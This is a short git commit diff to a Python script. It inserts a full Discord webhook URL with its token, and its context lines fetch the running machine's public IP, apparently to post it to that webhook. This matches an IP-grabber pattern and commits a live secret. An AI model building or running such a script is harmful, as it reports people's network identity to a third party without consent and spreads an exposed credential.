b1ccb442f1ee8f2b0f78a706b1d9516020886b4a
Nchtt777 <nihorat@gmail.com>
2026-09-15 20:05:17 +0200

    Update webhook URL and send embedfinished
    Updated webhook URL and ensured the embed is sent after populating fields.

--- main.py
+++ main.py
@@ -3,7 +3,7 @@ import json
 from dhooks import Webhook, Embed
 from datetime import datetime
 
-hook = Webhook("webhook-url-here")
+hook = Webhook("https://discord.com/api/webhooks/1549479091441246209/_qJ2cmSTcFZ59IEDc3TNKvx-bIkKq866aTwGSV4kGwazyUgCL7AURFAAX9WCrQHNzuoU")
 
 time = datetime.now().strftime("%H:%M %p")  
 ip = requests.get('https://api.ipify.org/').text
